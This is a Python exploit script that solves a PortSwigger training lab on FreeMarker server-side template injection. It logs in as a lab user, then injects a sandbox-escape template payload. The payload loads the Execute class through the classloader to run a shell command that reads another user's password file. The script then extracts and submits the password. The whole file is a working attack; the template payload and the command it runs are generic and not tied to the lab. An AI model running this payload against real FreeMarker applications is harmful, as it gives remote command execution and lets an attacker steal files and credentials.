# Server-side template injection in a sandboxed environment

# https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def dec_to_ascii(string):
	ascii_string = ''
	for char in string.split(' '):
		ascii_string += chr(int(char))
	return ascii_string

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def submit_password(s, url, password):
	print('[+] Trying to submit the Password to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": password}
	r = s.post(submit_path, data=submit_data)
	return r

def connect_user(s, url):
	print('\n[+] Trying to connect as content-manager user...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	csrf = get_csrf_token(r)
	login_path = url + '/login'
	connect_data = {'csrf': csrf, 'username': 'content-manager', 'password': 'C0nt3ntM4n4g3r'}
	r = s.post(login_path, data=connect_data)
	if 'Your username is: wiener' in r.text:
		print(f'[+] Connected as {connect_data.username} user !')
		return r
	return False

# cf payload1.java & payload2.java
def send_payload(s, url, csrf_token):
	# command = """${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}"""
	command = """<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}</p>"""
	payload = urllib.parse.quote_plus(command)
	post_template_path = url + '/product/template?productId=1'
	session = s.cookies.get('session')
	print('[+] Found session cookie:\t%s' % session)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	print("\n[+] Trying to URL encode payload:\n%s" % command)
	inject_data = 'template=' +  payload + '&csrf=' + csrf_token + '&template-action=preview'
	print("\n[+] Trying to inject payload:\n%s" % payload)
	print(f"\n[+] Sending post request on {post_template_path}\n")
	r = s.post(post_template_path, data=inject_data, headers=headers)
	time.sleep(1)
	if r.status_code == 200:
		return r
	else:
		print("[-] Command Injection Failed !!!")



##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Server-side template injection in a sandboxed environment')
	parser = argparse.ArgumentParser(description="[+] Lab: Server-side template injection in a sandboxed environment")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			r = connect_user(s, url)
			post_path = url + '/product/template?productId=1'
			r = s.get(post_path)
			csrf_token = get_csrf_token(r)
			r = send_payload(s, url, csrf_token)
			if r.status_code == 200 and (re.search('<div id=preview-result>\n(.*)&lt;/p&gt;', r.text) or re.search(b'<div id=preview-result>\n                    (.*)\n                    </div>', r.text.encode())):
				password = re.search('<div id=preview-result>\n(.*)&lt;/p&gt;', r.text).group(1).strip()
				print("[+] Found Carlos's password:\t%s" % password)
				r = submit_password(s, url, password)
			else:
				print('[-] The exploit failed to retrieve the Password <!>')
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
